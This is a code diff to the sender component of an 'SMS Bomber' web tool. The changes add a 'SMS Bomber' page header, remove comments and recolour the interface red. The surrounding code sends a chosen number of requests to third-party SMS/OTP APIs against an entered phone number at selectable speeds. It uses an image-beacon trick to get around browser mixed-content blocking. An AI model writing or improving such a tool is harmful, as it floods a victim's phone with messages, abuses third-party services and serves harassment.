@@ -69,9 +69,6 @@ const Sender: React.FC<SenderProps> = ({ templates, onSend, protectedNumbers, ac
       const isGet = node.method === 'GET';
 
       // MIXED CONTENT BYPASS STRATEGY
-      // If we are on HTTPS and target is HTTP GET, fetch will fail.
-      // We use the "Image Beacon" hack. It works for GET requests to fire-and-forget.
-      // Browsers consider images "Passive Mixed Content" and usually allow them.
       const isMixedContent = typeof window !== 'undefined' && 
                              window.location.protocol === 'https:' && 
                              url.trim().startsWith('http:');
@@ -79,12 +76,9 @@ const Sender: React.FC<SenderProps> = ({ templates, onSend, protectedNumbers, ac
       if (isGet && isMixedContent) {
           return new Promise<Response>((resolve) => {
               const img = new Image();
-              // Add timestamp to prevent caching
               const beaconUrl = url + (url.includes('?') ? '&' : '?') + `_t=${Date.now()}`;
               
               const finish = () => {
-                  // We resolve as success because if the image request fired, the GET hit the server.
-                  // We can't read the response, but for bombing, "Hit" is enough.
                   resolve({ 
                       status: 200, 
                       ok: true, 
@@ -93,15 +87,12 @@ const Sender: React.FC<SenderProps> = ({ templates, onSend, protectedNumbers, ac
               };
 
               img.onload = finish;
-              img.onerror = finish; // Even if it's not a valid image, the request was sent.
+              img.onerror = finish;
               img.src = beaconUrl;
-
-              // Safety timeout
               setTimeout(finish, 3000);
           });
       }
 
-      // Standard Fetch for others (POST or HTTPS GET)
       const response = await fetch(url, {
           method: node.method,
           headers: headers,
@@ -157,21 +148,12 @@ const Sender: React.FC<SenderProps> = ({ templates, onSend, protectedNumbers, ac
         try {
           const res = await executeNode(api, phoneNumber, signal);
           
-          // Status 0 is "Opaque" response from no-cors (successful send, unknown result)
-          // Status 2xx is standard Success
           const ok = (res.status >= 200 && res.status < 300) || res.status === 0;
           
           setStats(p => ({ success: p.success + (ok ? 1 : 0), fail: p.fail + (ok ? 0 : 1) }));
           addLog(`> [${api.name}] ${res.status === 0 ? 'SENT' : res.status} ${ok ? 'OK' : 'ERR'}`);
         } catch (e: any) {
           if (e.name !== 'AbortError') {
-             // Second Chance: If fetch failed, try Image Beacon fallback for GET
-             if (api.method === 'GET' && !e.message.includes('Image')) {
-                 // Try one last time with image beacon if original attempt wasn't beacon
-                 // (Though our logic above should have caught it, this catches other network errors)
-                 // Simplifying: just log error.
-             }
-             
              setStats(p => ({ ...p, fail: p.fail + 1 }));
              const errorMsg = e.message === 'Failed to fetch' ? 'Net Error/CORS' : e.message;
              addLog(`> [${api.name}] FAILED: ${errorMsg}`);
@@ -202,6 +184,18 @@ const Sender: React.FC<SenderProps> = ({ templates, onSend, protectedNumbers, ac
 
   return (
     <div className="p-5 pb-10 space-y-6 animate-fade-in">
+      
+      {/* Distinct Page Header for Bomber */}
+      <div className="border-b border-zinc-800 pb-4 flex items-center gap-3">
+          <div className="p-2 bg-red-600 rounded-lg shadow-[0_0_15px_rgba(220,38,38,0.4)]">
+             <Zap className="w-6 h-6 text-white fill-white" />
+          </div>
+          <div>
+             <h2 className="text-xl font-black italic tracking-tighter text-white uppercase">SMS Bomber</h2>
+             <p className="text-[10px] text-zinc-500 font-mono-code">V3.5 / HIGH_SPEED_ENGINE</p>
+          </div>
+      </div>
+
       <div className="space-y-4">
         
         {/* Number Input */}
@@ -214,7 +208,7 @@ const Sender: React.FC<SenderProps> = ({ templates, onSend, protectedNumbers, ac
              value={phoneNumber}
              onChange={(e) => setPhoneNumber(e.target.value.replace(/\D/g, '').slice(0, 11))}
              placeholder="017xxxxxxxx"
-             className="w-full bg-zinc-900 border border-zinc-800 rounded-lg px-4 py-3 text-white text-lg font-mono-code focus:border-emerald-500 focus:ring-1 focus:ring-emerald-500 outline-none transition-all placeholder-zinc-700"
+             className="w-full bg-zinc-900 border border-zinc-800 rounded-lg px-4 py-3 text-white text-lg font-mono-code focus:border-red-500 focus:ring-1 focus:ring-red-500 outline-none transition-all placeholder-zinc-700"
            />
         </div>
 
@@ -228,7 +222,7 @@ const Sender: React.FC<SenderProps> = ({ templates, onSend, protectedNumbers, ac
                 value={amount}
                 onChange={(e) => setAmount(e.target.value)}
                 placeholder="100"
-                className="w-full bg-zinc-900 border border-zinc-800 rounded-lg px-4 py-3 text-white text-lg font-mono-code focus:border-emerald-500 outline-none transition-all text-center"
+                className="w-full bg-zinc-900 border border-zinc-800 rounded-lg px-4 py-3 text-white text-lg font-mono-code focus:border-red-500 outline-none transition-all text-center"
               />
            </div>
 
@@ -242,7 +236,7 @@ const Sender: React.FC<SenderProps> = ({ templates, onSend, protectedNumbers, ac
                       disabled={isRunning}
                       onClick={() => setSpeed(s)}
                       className={`flex-1 py-2 rounded text-[10px] font-bold uppercase transition-all ${
-                        speed === s ? 'bg-zinc-800 text-white shadow-sm' : 'text-zinc-600 hover:text-zinc-400'
+                        speed === s ? 'bg-zinc-800 text-white shadow-sm border border-zinc-700' : 'text-zinc-600 hover:text-zinc-400'
                       }`}
                     >
                       {s}
@@ -257,8 +251,8 @@ const Sender: React.FC<SenderProps> = ({ templates, onSend, protectedNumbers, ac
           onClick={isRunning ? handleStop : handleStart}
           className={`w-full py-4 rounded-xl font-bold uppercase tracking-wider text-sm shadow-lg transition-all transform active:scale-[0.98] flex items-center justify-center gap-2 ${
             isRunning 
-            ? 'bg-red-600 hover:bg-red-500 text-white shadow-red-900/20' 
-            : 'bg-emerald-600 hover:bg-emerald-500 text-white shadow-emerald-900/20'
+            ? 'bg-zinc-800 hover:bg-zinc-700 text-red-500 border border-red-900/50' 
+            : 'bg-red-600 hover:bg-red-500 text-white shadow-red-900/20'
           }`}
         >
           {isRunning ? (
@@ -303,7 +297,7 @@ const Sender: React.FC<SenderProps> = ({ templates, onSend, protectedNumbers, ac
          {/* Progress Bar */}
          {isRunning && (
             <div className="h-1 bg-zinc-900 w-full">
-               <div className="h-full bg-emerald-500 transition-all duration-300" style={{ width: `${progress}%` }}></div>
+               <div className="h-full bg-red-500 transition-all duration-300" style={{ width: `${progress}%` }}></div>
             </div>
          )}
       </div>
